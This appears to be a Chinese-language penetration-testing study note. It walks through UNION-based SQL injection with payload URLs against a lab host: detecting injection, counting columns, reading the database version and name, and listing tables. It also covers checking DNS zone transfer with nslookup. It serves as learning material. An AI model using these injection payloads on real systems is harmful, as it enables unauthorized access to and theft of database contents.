#Pentester
##一、sql injection
![image](https://github.com/luyg24/IT_security/blob/master/guess_table.png)
###基本思路：
- 1. 判断是否有注入
- 2. 判断当前库名，表名，字段名
- 3. 获取数据

###sql基本用法
- 1.select id,num from test union select 1,2
一般会逐个替换1,2换成想要显示的信息，需要确定哪个位置可以正确显示，当只有一个位置可以显示的时候，可以使用concat
例如：select ip from temp union select concat(@@version,':',database());
例2：select concat('my','s','ql','+',@@version);   结果：mysql+5.6.28
例3：select num,ip from temp union select 1,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE version=10;
num为数字型，ip为字符型，information表里面的信息都是字符型，所有要放在2这个位置，放在1的位置会报错（类型不匹配）
注意：union后面跟的列的个数必须和前面select 的个数一致,union select 后面的数字可以接任意想获取的信息（version(),current_user(),@@version,database()等）
- 2.select id,num from test order by 2  根据num进行排序
   select * from test order by 4 根据第四列进行排序，通过这个语句可以判断数据表中有多少列

- 实战:
 1. 判断注入：
http://172.16.45.128/cat.php?id=1 and true   返回正确结果
http://172.16.45.128/cat.php?id=1 and false  返回错误结果
该url存在注入
 2. 判断查询的字段个数：
http://172.16.45.128/cat.php?id=1 union select 1,2,3,4 返回正确结果
 3.判断数据库版本和库名
http://172.16.45.128/cat.php?id=1 union select 1,@@version,3,4 这里把最后的2变成了@@verison 实际的sql语句变成了  select @@version , 放在2这个位置是因为在页面上有显示内容，可以直接把查询后的信息在页面上展示了，这个可以根据实际情况进行适当处理，2这个位置可以换成database()来获取库名字，user()获取数据库用户名
4. 判断表名
http://172.16.45.128/cat.php?id=1 union select 1,(select GROUP_CONCAT(table_name) FROM information_schema.tables),3,4
![image](https://github.com/luyg24/IT_security/blob/master/guess_table.png)

- 参考：http://drops.wooyun.org/tips/123
##二、
###dns区域传送检查
- nslookup 进入交互shell，使用server 指定dns服务器，然后 ls -d 域名，例如ls -d abc.com.cn   即可
参考：http://www.lijiejie.com/dns-zone-transfer-1/
- 

